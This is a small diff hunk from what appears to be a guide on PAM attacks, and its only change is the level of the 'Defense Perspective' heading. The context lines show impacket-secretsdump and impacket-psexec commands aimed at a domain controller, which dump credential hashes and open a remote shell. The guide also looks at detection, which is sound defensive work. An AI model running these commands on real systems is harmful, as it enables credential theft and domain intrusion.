@@ -343,7 +343,7 @@ impacket-secretsdump "$DOMAIN/$USER:$PASS@$DC_IP" | head -20
 impacket-psexec "$DOMAIN/$USER:$PASS@$DC_IP"
 ```
 
-## Defense Perspective
+### Defense Perspective
 
 ### Detecting PAM Attacks
 
